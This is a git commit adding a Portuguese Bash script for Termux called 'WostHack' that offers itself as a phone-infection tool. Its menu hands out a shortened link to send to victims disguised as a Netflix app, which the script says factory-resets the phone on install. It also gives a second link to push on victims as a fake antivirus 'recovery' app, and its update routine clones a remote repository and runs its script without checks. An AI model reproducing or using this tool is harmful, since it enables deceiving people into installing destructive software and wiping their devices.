2edc01252ed7264ac1687a37bea4486b8cf25750
LokyDev <126417627+RenanSylva9@users.noreply.github.com>
2023-04-23 19:58:46 -0300

    Create wosthack.sh

---
+++ wosthack.sh
@@ -0,0 +1,296 @@
+# A tool by Renan Sylva in Termux
+# Be a unique person not copy cat
+# Colours
+#-----------------
+red="\e[91m"
+rset="\e[0m"
+grn="\e[92m"
+ylo="\e[93m"
+blue="\e[94m"
+cyan="\e[96m"
+pink="\e[95m"
+#-----------------
+# scripting start
+banner(){
+vid
+echo -e '\e[93m               
+                         __________
+                      .~#########%%;~.
+                     /############%%;`\
+                    /######/~\/~\%%;,;,\
+                   |#######\    /;;;;.,.|
+                   |#########\/%;;;;;.,.|
+          XX       |##/~~\####%;;;/~~\;,|       XX
+        XX..X      |#|  o  \##%;/  o  |.|      X..XX
+      XX.....X     |##\____/##%;\____/.,|     X.....XX
+ XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@   WostHack v0.1      @#%,.@        
+                @#%,.@              @#%,.@          
+                  @#%,.@          @#%,.@            
+                     @#%,.@      @#%,.@             
+                       @#%.,@  @#%,.@              
+               Renan Sylva > Eh7Hackers
+'
+echo " " 
+echo -e "$red                       ▶Coded by$grn <EH7>$red◀$rset"
+echo -e "$red                      ⫸$ylo  Renan Sylva$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                    [Seja o Melhor de Você]$rset"
+echo " "
+echo " "
+}
+baner1(){
+clear
+echo -e '\e[93m               
+                         __________
+                      .~#########%%;~.
+                     /############%%;`\
+                    /######/~\/~\%%;,;,\
+                   |#######\    /;;;;.,.|
+                   |#########\/%;;;;;.,.|
+          XX       |##/~~\####%;;;/~~\;,|       XX
+        XX..X      |#|  o  \##%;/  o  |.|      X..XX
+      XX.....X     |##\____/##%;\____/.,|     X.....XX
+ XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@   WostHack v0.1      @#%,.@        
+                @#%,.@              @#%,.@          
+                  @#%,.@          @#%,.@            
+                     @#%,.@      @#%,.@             
+                       @#%.,@  @#%,.@              
+                Renan Sylva > Eh7Hackers
+'
+echo " " 
+echo -e "$red                       ▶Coded by$grn <EH7>$red◀$rset"
+echo -e "$red                      ⫸$ylo  Renan Sylva$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                    [Seja o Melhor de Você]$rset"
+echo " "
+echo " "
+}
+menu(){
+echo -e "$grn             ＞＞＞＞>>>＞$ylo [Opções]$grn ＜<<<＜＜＜＜$rset"
+echo " "
+echo " "
+echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infectar Cell"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Recuperar Cell"
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] Sobre"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Atualizar Script"
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Inscreva-se"
+echo -e "$red                        ➡$cyan [\e[92m6\e[96m] Mais"
+echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Bate Papo"
+echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Sair"
+echo " "
+echo " "
+echo -e "$grn               >＞＞＞＞＞$ylo [SELECIONE]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECIONE A OPÇÃO\e[92m: "
+read optnz
+if [ $optnz = "1" ];
+then
+virus
+elif [ $optnz = "2" ];
+then
+save
+elif [ $optnz = "3" ];
+then
+about
+elif [ $optnz = "4" ];
+then
+upd
+elif [ $optnz = "5" ];
+then
+am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "6" ];
+then
+am start -a android.intent.action.VIEW -d https://noob-hackers.github.io/noobspage > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "7" ];
+then
+am start -a android.intent.action.VIEW -d https://bit.ly/nhwhatschat > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "8" ];
+then
+exit 1
+else
+echo "wrong"
+exit
+fi
+}
+virus(){
+################
+clear
+echo
+echo -e '\e[92m 
+                    _  _  _____  ____  ____ 
+                   ( \( )(  _  )(_  _)( ___)
+                    )  (  )(_)(   )(   )__) 
+                   (_)\_)(_____) (__) (____) '
+echo " "
+echo -e "\e[91m 😈  Copie o Link abaixo com Nome Netflix e Mande para Alguém. Ao Instala-lo o Celular automaticamente será Redefinido de Fabrica.
+                                👇👇👇
+
+         \e[92mL1NK :- \e[96mhttps://tinyurl.com/uppdatesnew\e[91m
+
+                                 👆👆👆
+Use Apenas para fins educativos e não para Prejudicar alguém 😇✌️. Nosso grupo não se responsabiliza por nenhum tipo de perda você faz aos outros por este script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+save(){
+clear
+echo
+echo -e '\e[92m 
+                    _  _  _____  ____  ____ 
+                   ( \( )(  _  )(_  _)( ___)
+                    )  (  )(_)(   )(   )__) 
+                   (_)\_)(_____) (__) (____) '
+echo " "
+echo " "
+echo -e "\e[93m  Copie o link abaixo e envie para sua vítima e diga a ela
+que ele deve instalar este aplicativo ou então seu
+dispositivo não será recuperado.(Antivirus)
+                    👇👇👇
+
+        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
+
+                    👆👆👆
+Use apenas para fins divertidos, não para prejudicar alguém 😇✌️. 
+Nosso canal não se responsabiliza por nenhum tipo de
+perda que você causa aos outros por este script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+about(){
+clear
+echo -e '\e[91m
+         ──▐─▌──▐─▌──
+         ─▐▌─▐▌▐▌─▐▌─
+         ─█▄▀▄██▄▀▄█─
+         ──▄──██▌─▄──
+         ▄▀─█▀██▀█─▀▄
+         ▐▌▐▌─▐▌─▐▌▐▌
+         ─▐─█────█─▌─
+         ────▌──▐────
+'
+echo -e "\e[93m                  SOMOS HACKTIVISTAS \e[92mNITRO" | pv -qL 10
+echo -e "\e[93m             EU SOU \e[92mRENAN SYLVA" | pv -qL 10
+echo -e "\e[93m       IM A \e[92mGEEK\e[93m SOMOS EQUIPE EH7" | pv -qL 10
+echo -e "\e[93m             ESPERO QUE GOSTEM DESSE SCRIPT" | pv -qL 10
+echo -e "\e[93m         -12345678910- " | pv -qL 10
+echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
+echo -e "\e[93m        SITE COMPOSTO:\e[92m www.netflix.com.br\e[0m" | pv -qL 10
+echo -e "\e[92m                NUNCA É UM ADEUS.............." | pv -qL 10
+sleep 6.0
+banner
+menu
+}
+upd(){
+if [ -d "$HOME/infect" ];
+then
+cd $HOME
+rm -rf infect
+elif [ -d "$HOME/Infect" ];
+then
+cd $HOME
+rm -rf Infect
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mATUALIZAÇÃO ESTÁ ACONTECENDO, POR FAVOR, AGUARDE UM TEMPO....!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m           ATUALIZAÇÃO COM SUCESSO (ÚLTIMA VERSÃO)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd infect
+bash infect.sh
+}
+vid(){
+FILE=$HOME/infect/noob.noob
+if [ -f "$FILE" ]; then
+pop
+else
+echo
+fi
+}
+pop(){
+clear
+echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
+echo -e "\e[96m                ║  \e[93mHAI, I ACABOU DE CARREGAR NOVO\e[96m VIDEO   ║\e[0m"
+echo -e "\e[96m                ║      ASSISTA VÍDEO NOVO AGORA....!    ║\e[0m"
+echo -e "\e[96m                ║                                   ║\e[0m"
+echo -e "\e[96m                ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
+echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
+echo -e "\e[96m                ║        Select \e[91mt\e[96m to cancel\e[96m         ║\e[0m"
+echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
+echo -e "\e[96m                ║     Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
+echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
+echo -en "\e[32mSELECIONE A OPÇÃO [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
+read p
+if [ "$p" = "y" ];
+then
+am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
+clear
+baner1
+menu
+elif [ "$p" = "t" ];
+then
+clear
+baner1
+menu
+elif [ "$p" = "z" ];
+then
+cd $HOM/infect
+rm noob.noob
+banner
+menu
+else
+banner
+menu
+exit
+fi
+}
+banner
+menu
